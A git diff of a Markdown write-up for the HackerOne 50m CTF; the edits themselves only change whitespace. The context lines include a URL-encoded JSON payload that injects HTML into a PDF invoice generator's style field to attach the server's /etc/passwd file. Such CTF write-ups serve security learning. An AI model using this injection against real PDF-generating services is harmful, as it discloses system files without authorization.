@@ -10,7 +10,7 @@ tags:
 private: false
 
 ---
-### Writeup Hackerone 50m CTF
+### Writeup Hackerone 50m CTF 
 
 First stage of this ctf we need to solve an hidden file from an image which posted by HackerOne at twitter [https://twitter.com/hacker0x01/status/1100543680383832065?lang=en](https://twitter.com/hacker0x01/status/1100543680383832065?lang=en).
 
@@ -514,7 +514,7 @@ that feature is allow us to embed any file to the pdf, so i try to embed /etc/pa
         }
       }
     }
-
+    
     URL ENCODED:
     %7B%0D%0A++%22companyName%22%3A+%22Hackerone%22%2C%0D%0A++%22email%22%3A+%22administrator%40hackerone.com%22%2C%0D%0A++%22invoiceNumber%22%3A+%221337%22%2C%0D%0A++%22date%22%3A+%221337-1337-01%22%2C%0D%0A++%22items%22%3A+%5B%0D%0A++++%5B%0D%0A++++++%221%22%2C%0D%0A++++++%22%22%2C%0D%0A++++++%22%22%2C%0D%0A++++++%2210%22%0D%0A++++%5D%0D%0A++%5D%2C%0D%0A++%22styles%22%3A+%7B%0D%0A++++%22body%22%3A+%7B%0D%0A++++++%22background-color%22%3A+%22white%22%2C%0D%0A++++++%22%3Cscript%2Fstyle%3E%3Ca+rel%3D%27attachment%27+href%3D%27file%3A%2F%2F%2Fetc%2Fpasswd%27%3Efile%3Cscript%2Fa%3E%3Cstyle%3E%2A%7Bbackground-image%22%3A+%22url%28%27%27%29%22%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D
 
